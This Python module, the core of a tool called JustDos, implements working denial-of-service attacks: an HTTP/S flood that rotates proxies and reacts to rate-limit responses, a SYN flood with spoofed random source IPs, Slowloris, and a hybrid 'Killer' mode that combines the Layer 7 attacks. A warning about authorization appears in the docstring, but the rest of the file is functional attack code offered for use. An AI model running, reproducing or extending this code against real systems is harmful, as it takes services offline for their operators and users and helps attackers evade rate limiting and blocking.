# engine/core.py

"""
Core Attack Logic for JustDos.

This module contains the main implementation for the different attack vectors
supported by the tool, including:
- Layer 7: HTTP/S Flood, Slowloris
- Layer 4: SYN Flood
- Hybrid: Killer (Slowloris + HTTP Flood)

It orchestrates workers, manages attack duration, and reports progress.
This module is designed to be called by the command-line interface in `main.py`.

WARNING: This module contains implementations of network attack vectors.
Using this code against targets without explicit permission is illegal and unethical.
It is intended solely for educational purposes, testing in controlled environments,
or with explicit consent from the target. Always ensure you have proper authorization
before conducting any tests. Please read the usage and ethics permits at `LEGALLITY.md` for more details.
"""

import asyncio
import time
import sys
import multiprocessing as mp
import argparse
import random
import socket
from typing import List, Optional, Tuple
from urllib.parse import urljoin
from itertools import cycle

import httpx
from termcolor import colored

# Scapy is conditionally imported for Layer 4 attacks
try:
    from scapy.all import IP, TCP, send, RandIP, RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Import project modules
# Assuming these utils are in the parent directory, adjust if necessary
sys.path.append('..')
from utils.logger import setup_logging
from utils.randomizer import HeaderFactory, get_random_user_agent
from engine.proxy_manager import AdaptiveProxyPool, load_and_test_proxies
from engine.crawler import crawl_target_paths
from engine.benchmark import BenchmarkManager
from engine.planner import StrategyPlanner

# --- Configuration ---
REQUESTS_PER_BATCH = 500  # Number of requests per worker batch
logger = setup_logging()

# ======================================================
# LAYER 7 ATTACK - HTTP/S FLOOD
# ======================================================

async def _send_single_http_request(
    client: httpx.AsyncClient,
    target_url: str,
    path: str,
    benchmark: BenchmarkManager,
    header_factory: HeaderFactory,
    planner: Optional[StrategyPlanner] = None,
) -> Tuple[Optional[int], float]:
    """
    Executes a single asynchronous HTTP GET request, records its performance,
    and updates the planner if provided.
    """
    status_code: Optional[int] = None
    request_start_time = time.monotonic()
    headers = header_factory.get_headers()
    try:
        response = await client.get(target_url, headers=headers)
        status_code = response.status_code
    except (httpx.TimeoutException, httpx.ConnectError, httpx.ProxyError, httpx.ReadError) as e:
        logger.warning(f"Request to {target_url} failed: {type(e).__name__}")
    except Exception as e:
        logger.error(f"Unexpected error during request to {target_url}: {e}")
    finally:
        latency = time.monotonic() - request_start_time
        await benchmark.record_request(status_code, latency)
        if planner:
            await planner.analyze(path, status_code, latency)
    return status_code, latency

async def _http_flood_worker(
    worker_id: int,
    client: httpx.AsyncClient,
    base_url: str,
    attack_paths: List[str],
    proxy_pool: Optional[AdaptiveProxyPool],
    stop_event: asyncio.Event,
    benchmark: BenchmarkManager,
    planner: Optional[StrategyPlanner],
    header_factory: HeaderFactory,
):
    """
    The main async loop for a single HTTP flood worker.
    """
    print(colored(f"[+] HTTP Worker {worker_id} started.", "blue"))
    path_cycle = cycle(attack_paths)
    while not stop_event.is_set():
        proxy: Optional[str] = None
        if proxy_pool:
            proxy = await proxy_pool.get_proxy()
            if proxy is None:
                logger.error(f"Worker {worker_id} could not get a proxy. Stopping.")
                break
            client.proxies = {'all://': proxy}
        tasks = []
        for _ in range(REQUESTS_PER_BATCH):
            if stop_event.is_set():
                break
            path = next(path_cycle)
            if planner and await planner.is_path_dangerous(path):
                continue
            full_url = urljoin(base_url, path)
            tasks.append(_send_single_http_request(client, full_url, path, benchmark, header_factory, planner))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        if proxy_pool and proxy:
            status_codes = [r[0] for r in results if isinstance(r, tuple)]
            num_failures = status_codes.count(None)
            final_status_for_proxy: Optional[int] = 200
            if 429 in status_codes:
                final_status_for_proxy = 429
            elif 403 in status_codes:
                final_status_for_proxy = 403
            elif len(status_codes) > 0 and num_failures / len(status_codes) > 0.5:
                final_status_for_proxy = None
            await proxy_pool.release_proxy(proxy, final_status_for_proxy)
        await asyncio.sleep(0.01)

async def http_flood_orchestrator(args: argparse.Namespace, stop_event: asyncio.Event, benchmark: BenchmarkManager):
    """Main async function to set up and run the HTTP Flood attack component."""
    protocol = 'https' if 'https' in args and args.https else 'http'
    base_url = f"{protocol}://{args.target}:{args.port}/"
    header_factory = HeaderFactory(pool_size=2000)
    planner = StrategyPlanner() if 'adaptive' in args and args.adaptive else None
    proxy_pool: Optional[AdaptiveProxyPool] = None
    cooldown_task: Optional[asyncio.Task] = None
    if 'use_proxies' in args and args.use_proxies:
        if not args.proxy_file:
            print(colored("[!] ERROR: --proxy-file must be provided when using --use-proxies.", "red"))
            return
        proxies = await load_and_test_proxies(file_path=args.proxy_file, test_url=base_url, protocol_prefix=protocol)
        if not proxies:
            print(colored("[!] No working proxies found. Aborting attack.", "red"))
            return
        proxy_pool = AdaptiveProxyPool(proxies, logger)
        cooldown_task = asyncio.create_task(proxy_pool.cooldown_manager())
    attack_paths = [args.path] if 'path' in args and args.path else await crawl_target_paths(base_url)
    if not attack_paths:
        print(colored("[!] No attack paths found or specified for HTTP Flood. Using '/'.", "yellow"))
        attack_paths = ['/']
    print(colored(f"\n[+] Starting HTTP Flood component on {args.target} with {args.workers} workers...", "cyan", attrs=["bold"]))
    if proxy_pool:
        print(colored(f"    Using {len(proxy_pool.available_proxies)} tested proxies.", "cyan"))
    client_params = {'http2': True, 'limits': httpx.Limits(max_connections=None, max_keepalive_connections=args.workers), 'timeout': httpx.Timeout(10.0), 'verify': False}
    async with httpx.AsyncClient(**client_params) as client:
        worker_tasks = [asyncio.create_task(_http_flood_worker(i, client, base_url, attack_paths, proxy_pool, stop_event, benchmark, planner, header_factory)) for i in range(args.workers)]
        await asyncio.gather(*worker_tasks, return_exceptions=True)
        if cooldown_task:
            cooldown_task.cancel()

def run_http_flood(args: argparse.Namespace):
    """Public wrapper to start the HTTP Flood attack."""
    stop_event = asyncio.Event()
    benchmark = BenchmarkManager()
    try:
        asyncio.run(http_flood_orchestrator(args, stop_event, benchmark))
    except KeyboardInterrupt:
        print(colored("\n[!] User interruption detected.", "yellow"))
    finally:
        print(colored("\n[!] Shutting down workers and cleaning up...", "yellow"))
        stop_event.set()
        print(colored(f"\n\n[!] Attack Finished", "red", attrs=["bold"]))
        benchmark.generate_report()

# ======================================================
# LAYER 4 ATTACK: SYN FLOOD
# ======================================================

def _syn_flood_worker(target_ip: str, port: int, rate_limit: int, stop_event: mp.Event, stats: mp.Value):
    """A single SYN flood worker process."""
    packet_count = 0
    delay = 1.0 / rate_limit if rate_limit > 0 else 0
    while not stop_event.is_set():
        try:
            ip_layer = IP(src=str(RandIP()), dst=target_ip)
            tcp_layer = TCP(sport=RandShort(), dport=port, flags="S")
            send(ip_layer / tcp_layer, verbose=0)
            packet_count += 1
            if delay > 0:
                time.sleep(delay)
        except Exception as e:
            print(f"\nError in SYN worker: {e}", file=sys.stderr)
            break
    with stats.get_lock():
        stats.value += packet_count

def run_syn_flood(args: argparse.Namespace):
    """Public wrapper to start the SYN Flood attack."""
    if not SCAPY_AVAILABLE:
        print(colored("\n[!] ERROR: 'scapy' library is not installed. It is required for SYN Flood.", "red"))
        print(colored("    Please run: pip install scapy", "yellow"))
        sys.exit(1)
    print(colored(f"\n[+] Starting SYN Flood on {args.target}:{args.port} with {args.processes} processes...", "cyan"))
    with mp.Manager() as manager:
        total_packets = manager.Value('i', 0)
        stop_event = manager.Event()
        start_time = time.time()
        with mp.Pool(processes=args.processes) as pool:
            process_args = [(args.target, args.port, args.rate_limit, stop_event, total_packets)] * args.processes
            pool.starmap_async(_syn_flood_worker, process_args)
            try:
                end_time = start_time + args.duration
                while time.time() < end_time:
                    remaining = max(0, end_time - time.time())
                    pps = total_packets.value / (time.time() - start_time + 1e-6)
                    print(colored(f"\r[+] Packets Sent: {total_packets.value} | PPS: {pps:.1f} | Time Left: {int(remaining)}s  ", "green"), end="", flush=True)
                    time.sleep(1)
            except KeyboardInterrupt:
                print(colored("\n[!] User interruption detected.", "yellow"))
            finally:
                print(colored("\n[!] Stopping worker processes...", "yellow"))
                stop_event.set()
                pool.close()
                pool.join()
                total_time = time.time() - start_time
                final_pps = total_packets.value / total_time if total_time > 0 else 0
                print(colored(f"\n\n[!] Attack Finished", "red", attrs=["bold"]))
                print(colored(f"    - Total Packets: {total_packets.value}", "yellow"))
                print(colored(f"    - Duration: {total_time:.2f} seconds", "yellow"))
                print(colored(f"    - Average PPS: {final_pps:.2f}", "yellow"))

# ======================================================
# LAYER 7 ATTACK - SLOWLORIS
# ======================================================

async def _slowloris_worker(target_host: str, target_port: int, stop_event: asyncio.Event, interval: int, active_sockets: list, lock: asyncio.Lock):
    """A single Slowloris worker."""
    sock: Optional[socket.socket] = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        await asyncio.to_thread(sock.connect, (target_host, target_port))
        sock.settimeout(None)
        sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8'))
        sock.send(f"Host: {target_host}\r\n".encode('utf-8'))
        sock.send(f"User-Agent: {get_random_user_agent()}\r\n".encode('utf-8'))
        sock.send("Connection: keep-alive\r\n".encode('utf-8'))
        async with lock:
            active_sockets.append(sock)
        while not stop_event.is_set():
            try:
                sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode('utf-8'))
                await asyncio.sleep(interval)
            except (socket.error, BrokenPipeError):
                break
    except Exception:
        pass
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass
            async with lock:
                if sock in active_sockets:
                    active_sockets.remove(sock)

async def slowloris_orchestrator(args: argparse.Namespace, stop_event: Optional[asyncio.Event] = None, active_sockets: Optional[list] = None, lock: Optional[asyncio.Lock] = None):
    """
    Main async function to set up and run the Slowloris attack.
    Handles both standalone and component mode.
    """
    is_standalone = False
    if stop_event is None or active_sockets is None or lock is None:
        is_standalone = True
        stop_event = asyncio.Event()
        active_sockets = []
        lock = asyncio.Lock()

    print(colored(f"\n[+] Starting Slowloris component on {args.target}:{args.port} with {args.connections} connections...", "cyan"))
    
    # This task list is managed within the orchestrator's scope
    tasks = []
    
    async def replenish_workers():
        """Inner function to create and manage worker tasks."""
        while not stop_event.is_set():
            async with lock:
                needed = args.connections - len(active_sockets)
            if needed > 0:
                new_tasks = [asyncio.create_task(_slowloris_worker(args.target, args.port, stop_event, args.interval, active_sockets, lock)) for _ in range(needed)]
                tasks.extend(new_tasks)
            await asyncio.sleep(1)

    replenish_task = asyncio.create_task(replenish_workers())

    if is_standalone:
        start_time = time.time()
        try:
            end_time = start_time + args.duration
            while time.time() < end_time:
                remaining = max(0, args.duration - (time.time() - start_time))
                async with lock:
                    current_active = len(active_sockets)
                print(colored(f"\r[+] Active Connections: {current_active}/{args.connections} | Time Left: {int(remaining)}s  ", "green"), end="", flush=True)
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            print(colored("\n[!] User interruption detected.", "yellow"))
        finally:
            print(colored("\n[!] Shutting down all connections...", "yellow"))
            stop_event.set()
            replenish_task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            print(colored(f"\n\n[!] Slowloris Attack Finished", "red", attrs=["bold"]))
    else:
        # In component mode, just wait for the replenish task to be cancelled externally
        await asyncio.gather(replenish_task, return_exceptions=True)


def run_slowloris_attack(args: argparse.Namespace):
    """Public wrapper to start the Slowloris attack in standalone mode."""
    # This now calls the orchestrator with only one argument, which is handled correctly.
    asyncio.run(slowloris_orchestrator(args))

# ======================================================
# HYBRID ATTACK - KILLER (SLOWLORIS + HTTP FLOOD)
# ======================================================

async def killer_orchestrator(args: argparse.Namespace):
    """Orchestrates the hybrid Slowloris and HTTP Flood attack."""
    print(colored(f"\n[+] Starting KILLER hybrid attack on {args.target}:{args.port}...", "red", attrs=["bold"]))
    stop_event = asyncio.Event()
    slowloris_sockets: list = []
    slowloris_lock = asyncio.Lock()
    http_benchmark = BenchmarkManager()

    # Call the orchestrator with all arguments for component mode
    slowloris_task = asyncio.create_task(slowloris_orchestrator(args, stop_event, slowloris_sockets, slowloris_lock))
    http_flood_task = asyncio.create_task(http_flood_orchestrator(args, stop_event, http_benchmark))

    start_time = time.monotonic()
    try:
        end_time = start_time + args.duration
        while time.monotonic() < end_time:
            elapsed = time.monotonic() - start_time
            remaining = max(0, args.duration - elapsed)
            async with slowloris_lock:
                active_conns = len(slowloris_sockets)
            total_reqs = http_benchmark.get_total_requests()
            rps = total_reqs / (elapsed + 1e-6)
            status_counts = http_benchmark.response_counts
            ok_count = sum(v for k, v in status_counts.items() if k and k.startswith('2'))
            status_line = f"\r[+] Time Left: {int(remaining)}s | Slowloris Conns: {active_conns}/{args.connections} | HTTP Reqs: {total_reqs} (OK: {ok_count}) | RPS: {rps:.1f}  "
            print(colored(status_line, "green"), end="", flush=True)
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print(colored("\n[!] User interruption detected.", "yellow"))
    finally:
        print(colored("\n[!] Shutting down hybrid attack...", "yellow"))
        stop_event.set()
        await asyncio.gather(slowloris_task, http_flood_task, return_exceptions=True)
        print(colored(f"\n\n[!] KILLER Attack Finished", "red", attrs=["bold"]))
        http_benchmark.generate_report()

def run_killer_attack(args: argparse.Namespace):
    """Public wrapper to start the Killer hybrid attack."""
    try:
        asyncio.run(killer_orchestrator(args))
    except Exception as e:
        print(colored(f"\nAn error occurred in the killer orchestrator: {e}", "red"))
